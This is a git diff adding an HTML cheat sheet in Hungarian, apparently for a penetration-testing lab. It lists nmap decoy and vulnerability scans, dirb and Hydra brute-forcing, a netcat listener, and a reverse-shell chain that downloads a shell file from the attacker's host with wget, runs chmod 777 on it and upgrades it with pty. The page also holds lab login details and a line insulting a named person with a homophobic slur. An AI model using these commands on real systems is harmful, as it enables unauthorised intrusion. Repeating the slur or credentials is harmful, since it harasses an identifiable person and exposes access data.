@@ -11,6 +11,121 @@
         <h1>EtikusH</h1>
         <hr>
     </header>
+    <nav id="nav">
+        nav
+        <hr>
+    </nav>
+
+    <a href="#nav">
+    <aside>
+    </aside>
+    </a>
+
+    <article>
+        <div id="alapadat">
+            <p>https://172.22.214.143:2222</p>
+            <p>Felhasználónév: JN5S0E</p>
+            <p>24*it</p>
+            <p>Parrot: 30.0.1.15</p>
+        </div>
+
+        <h2 id="nmap">Nmap <kbd>nmap &ltip&gt</kbd></h2>
+
+        <p><kbd id="fo">nmap -sV -sS -Pn &ltip&gt</kbd></p>
+
+        <p>Pingelés: <kbd>ping &ltip&gt</kbd></p>
+        <p>UDP Scan: <kbd>-sU</kbd></p>
+        <p>1/1 Ping scan: <kbd>-sn</kbd></p>
+        <p>Full TCP kézfogás: <kbd>-sT</kbd></p>
+        <p>TCP SYN scan: <kbd>-sS</kbd></p>
+        <p>OS kiderítés: <kbd>-O</kbd></p>
+        <p>Decoyed: <kbd>nmap -D RND:10 &lttarget.ip&gt</kbd></p>
+        <p>Script futtatás: <kbd>--script vuln</kbd></p>
+        <p>Script futtatás: <kbd>--script safe</kbd></p>
+        <p>Milyen szolgáltatás: <kbd>-sV</kbd></p>
+        <p>Gép fix online, csak portok scannelése: <kbd>-Pn</kbd></p>
+        <p>Portok: <kbd>-P 22-2000</kbd></p>
+        <p>Timing (higher is faster): <kbd>-T&lt0-5&gt</kbd></p>
+
+        <hr>
+
+
+        
+        <h2 id="ssh">SSH <kbd>ssh user@computer</kbd></h2>
+
+        <p><kbd id="fo">ssh -p &ltport&gt -i &ltprivate_key_file&gt user@hostname_or_IP</kbd></p>
+
+        <hr>
+
+
+        
+        <h2 id="dirb">DirB</h2>
+
+        <p><kbd id="fo">dirb &ltip&gt /usr/share/wordslist/dirb/common.txt -r</kbd></p>
+
+        <p>Username+password <kbd>-U &ltusername:password&gt</kbd></p>
+        <p>Fájlkiterjesztés <kbd>-X .php,.html,.css</kbd></p>
+        
+        <hr>
+
+
+
+
+        <h2 id="hydra">Hydra</h2>
+
+        <p><kbd id="fo">hydra -l &ltusername&gt -P /usr/share/wordslist/rockyou.txt &lttarget-url-login-page&gt http-get</kbd></p>
+        
+        <hr>
+
+        
+
+        <h2 id="netcat">Listener: NetCat</h2>
+
+        <p><kbd id="fo">nc -lvp &ltport&gt</kbd></p>
+        
+        <hr>
+
+
+
+        <h2 id="reverseshell">Reverse Shell</h2>
+
+        <p>Infinitelogins MSFvenom chatsheet</p>
+        <p>stageless, non-meeterpreter</p>
+
+        <h2 id="shellchain">Shell chaining</h2>
+        <ol>
+            <li>Shell készítés L2 portra</li>
+            <li>Listener készítés X2</li>
+            <li>Webserver indítás ott ahol a .shell file van <kbd>python3 -m http.server</kbd></li>
+            <li>Instabil shell nyitása és
+                <ol>
+                    <li>cd/tmp;rm -rf xyz.shell;wget https://30.0.1.15:8000/xyz.shell;chmod 777 xyz.shell</li>
+                </ol>
+            </li>
+            <li>Shell upgrade: <kbd>python3 -c "import pty;pty.spawn('/bin/bash')"</kbd></li>
+        </ol>
+        
+        <hr>
+
+
+
+        <h2 id="wpscan">WPscan</h2>
+
+        <p><kbd id="fo">wpscan --url &ltip&gt -e ap,at,u</kbd></p>
+        <p>Akos BUZI(szereti a faszt)</p>
+
+        <hr>
+
+
+
+
+
+
+
+
+
+
+    </article>
     
 </body>
 </html>
